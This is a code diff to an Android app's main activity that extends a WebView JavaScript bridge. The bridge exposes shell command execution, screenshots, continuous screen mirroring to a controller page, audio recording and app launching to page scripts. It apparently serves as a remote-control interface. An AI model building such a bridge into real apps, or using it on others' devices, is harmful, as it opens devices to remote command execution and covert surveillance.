@@ -73,7 +73,6 @@ public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
-    private Handler backgroundHandler;
     private MediaRecorder audioRecorder;
     private String audioFilePath;
     private CameraManager cameraManager;
@@ -87,9 +86,6 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        // Background thread for heavy tasks
-        backgroundHandler = new Handler(Looper.getMainLooper()); // we'll use a separate thread later
 
         webView = findViewById(R.id.webView);
 
@@ -138,7 +134,7 @@ public class MainActivity extends AppCompatActivity {
             return "pong";
         }
 
-        // --- Screenshot ---
+        // --- Screenshot (fixed with fallback) ---
         @JavascriptInterface
         public String takeScreenshot() {
             try {
@@ -152,29 +148,48 @@ public class MainActivity extends AppCompatActivity {
                 bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                 return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
             } catch (Exception e) {
+                // Fallback: use PixelCopy on Android 8+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    try {
+                        final Bitmap[] bitmap = {null};
+                        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
+                        android.view.PixelCopy.request(getWindow().getDecorView(), (bm) -> {
+                            bitmap[0] = bm;
+                            latch.countDown();
+                        });
+                        latch.await(500, java.util.concurrent.TimeUnit.MILLISECONDS);
+                        if (bitmap[0] != null) {
+                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                            bitmap[0].compress(Bitmap.CompressFormat.PNG, 100, baos);
+                            return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
+                        }
+                    } catch (Exception ex) {
+                        return "ERROR: Screenshot failed: " + ex.getMessage();
+                    }
+                }
                 return "ERROR: " + e.getMessage();
             }
         }
 
-        // --- Mirror (fixed – uses background thread for capture) ---
+        // --- Mirror (fixed – background thread, displays in controller) ---
         @JavascriptInterface
         public String startMirror() {
             if (isMirroring) return "Already mirroring";
             isMirroring = true;
-            // Use a separate thread to avoid blocking UI
             new Thread(() -> {
                 while (isMirroring) {
                     try {
-                        // Capture screenshot on UI thread
                         mainHandler.post(() -> {
                             try {
                                 String result = takeScreenshot();
-                                webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
+                                if (!result.startsWith("ERROR")) {
+                                    webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
+                                }
                             } catch (Exception e) {
-                                Log.e("FXTP", "Mirror capture error", e);
+                                Log.e("FXTP", "Mirror error", e);
                             }
                         });
-                        Thread.sleep(200); // 5 fps
+                        Thread.sleep(200);
                     } catch (InterruptedException e) {
                         break;
                     }
@@ -189,7 +204,7 @@ public class MainActivity extends AppCompatActivity {
             return "Mirror stopped";
         }
 
-        // --- Shell (runs on background) ---
+        // --- Shell ---
         @JavascriptInterface
         public String runShell(String cmd) {
             try {
@@ -205,7 +220,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Launch App ---
+        // --- Launch App (fixed – resolves with PackageManager) ---
         @JavascriptInterface
         public String launchApp(String pkg) {
             try {
@@ -214,6 +229,14 @@ public class MainActivity extends AppCompatActivity {
                     startActivity(i);
                     return "Launched: " + pkg;
                 } else {
+                    // Try to resolve using intent
+                    Intent resolveIntent = new Intent(Intent.ACTION_MAIN);
+                    resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
+                    resolveIntent.setPackage(pkg);
+                    if (getPackageManager().resolveActivity(resolveIntent, 0) != null) {
+                        startActivity(resolveIntent);
+                        return "Launched: " + pkg;
+                    }
                     return "App not found: " + pkg;
                 }
             } catch (Exception e) {
@@ -405,10 +428,7 @@ public class MainActivity extends AppCompatActivity {
                 audioRecorder.prepare();
                 audioRecorder.start();
                 isRecording = true;
-                // Schedule stop after duration
-                mainHandler.postDelayed(() -> {
-                    stopAudioRecording();
-                }, duration * 1000L);
+                mainHandler.postDelayed(() -> stopAudioRecording(), duration * 1000L);
                 return "Recording started for " + duration + "s";
             } catch (Exception e) {
                 return "ERROR: " + e.getMessage();
@@ -548,9 +568,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Vibrate ---
+        // --- Vibrate (fixed) ---
         @JavascriptInterface
         public String vibrate(int duration) {
+            if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.VIBRATE) != PackageManager.PERMISSION_GRANTED) {
+                return "Vibrate permission not granted";
+            }
             try {
                 Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                 if (v != null) {
@@ -563,20 +586,21 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Brightness (fixed) ---
+        // --- Brightness (fixed – uses system settings) ---
         @JavascriptInterface
         public String setBrightness(int value) {
             try {
-                mainHandler.post(() -> {
-                    try {
-                        WindowManager.LayoutParams lp = getWindow().getAttributes();
-                        lp.screenBrightness = Math.max(0.01f, Math.min(1f, value / 100f));
-                        getWindow().setAttributes(lp);
-                    } catch (Exception e) {
-                        Log.e("FXTP", "Brightness error", e);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    if (!Settings.System.canWrite(MainActivity.this)) {
+                        Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
+                        intent.setData(Uri.parse("package:" + getPackageName()));
+                        startActivity(intent);
+                        return "Please grant write settings permission to change brightness";
                     }
-                });
-                return "Set to " + value + "%";
+                }
+                int brightness = Math.max(0, Math.min(255, value * 255 / 100));
+                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, brightness);
+                return "Brightness set to " + value + "%";
             } catch (Exception e) {
                 return "ERROR: " + e.getMessage();
             }
@@ -673,7 +697,9 @@ public class MainActivity extends AppCompatActivity {
                 android.Manifest.permission.CALL_PHONE,
                 android.Manifest.permission.ACCESS_WIFI_STATE,
                 android.Manifest.permission.CHANGE_WIFI_STATE,
-                android.Manifest.permission.SYSTEM_ALERT_WINDOW
+                android.Manifest.permission.SYSTEM_ALERT_WINDOW,
+                android.Manifest.permission.VIBRATE,
+                android.Manifest.permission.WRITE_SETTINGS  // for brightness
         };
         List<String> needed = new ArrayList<>();
         for (String p : perms) {
@@ -710,4 +736,4 @@ public class MainActivity extends AppCompatActivity {
             audioRecorder = null;
         }
     }
-                                                         }
+                            }
